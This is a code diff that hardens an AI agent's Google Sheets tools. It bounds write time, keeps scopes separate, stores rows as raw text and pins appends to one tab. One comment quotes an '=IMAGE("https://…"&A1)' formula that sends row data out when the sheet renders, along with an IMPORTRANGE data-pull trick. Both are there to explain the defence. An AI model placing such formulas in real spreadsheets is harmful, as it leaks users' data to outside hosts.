@@ -36,6 +36,12 @@ MAX_PAGE_CHARS = 12_000
 
 WRITE_SCOPE = "https://www.googleapis.com/auth/spreadsheets"
 
+# A write that hangs is worse than a read that hangs: the caller cannot tell
+# whether the rows landed. Bounded so the agent gets an answer either way and
+# can say so honestly. Same order as the MR read path — a Sheets round trip is
+# a Sheets round trip.
+SHEETS_WRITE_TIMEOUT_SECONDS = 30
+
 
 class ToolError(RuntimeError):
     """A tool could not do its job. Carries a message meant for the user."""
@@ -151,13 +157,19 @@ def _write_service():
     """A write-scoped Sheets client, separate from Marketing Research's.
 
     MR's service stays read-only scoped so "MR can only read" remains literally
-    true rather than a claim about how carefully we call it.
+    true rather than a claim about how carefully we call it. Only the transport
+    plumbing is shared with MR (timeout + cached ADC lookup) — the scope, which
+    is the part that matters, is this module's own.
     """
-    import google.auth
     from googleapiclient.discovery import build
 
-    creds, _ = google.auth.default(scopes=[WRITE_SCOPE])
-    return build("sheets", "v4", credentials=creds, cache_discovery=False)
+    sheets_source, _, _ = _mr()
+    creds = sheets_source.cached_credentials([WRITE_SCOPE])
+    return build(
+        "sheets", "v4",
+        http=sheets_source.timed_http(creds, SHEETS_WRITE_TIMEOUT_SECONDS),
+        cache_discovery=False,
+    )
 
 
 def _ensure_tab(service, sheet_id: str, tab: str) -> bool:
@@ -194,7 +206,11 @@ def sheet_append(url_or_id: str, rows: list[list[Any]], tab: str | None = None) 
         service.spreadsheets().values().append(
             spreadsheetId=sheet_id,
             range=f"'{target}'!A1",
-            valueInputOption="USER_ENTERED",
+            # RAW, never USER_ENTERED: the rows come from a model, and an
+            # entered "=IMPORTRANGE(...)" would pull data nobody granted while
+            # "=IMAGE(\"https://…\"&A1)" exfiltrates the row on render. Stored
+            # as text, a formula is just characters.
+            valueInputOption="RAW",
             insertDataOption="INSERT_ROWS",
             body={"values": values},
         ).execute()
@@ -285,12 +301,16 @@ TOOLS: dict[str, dict] = {
         "help": 'Read a sheet. {"tool":"sheet_read","sheet":"<url>","tab":"Leads"}',
     },
     "sheet_append": {
-        "run": lambda a: sheet_append(a.get("sheet", ""), a.get("rows") or [], a.get("tab")),
-        "args": "sheet, rows (list of lists), tab (optional)",
+        # The tab is pinned, not taken from `a`: "its own tab" was only ever
+        # true by convention, and a model naming an existing tab turned an
+        # append-only tool into one that writes into live data.
+        "run": lambda a: sheet_append(a.get("sheet", ""), a.get("rows") or [], DEFAULT_TAB),
+        "args": "sheet, rows (list of lists)",
         "help": (
             'Add rows to a sheet. {"tool":"sheet_append","sheet":"<url>",'
-            '"rows":[["Vendor","Note"]]} — appends to its own tab; it CANNOT '
-            "overwrite anything."
+            '"rows":[["Vendor","Note"]]} — always appends to the '
+            f'"{DEFAULT_TAB}" tab, which it creates if missing; it CANNOT '
+            "overwrite anything or write to any other tab."
         ),
     },
     "web_search": {
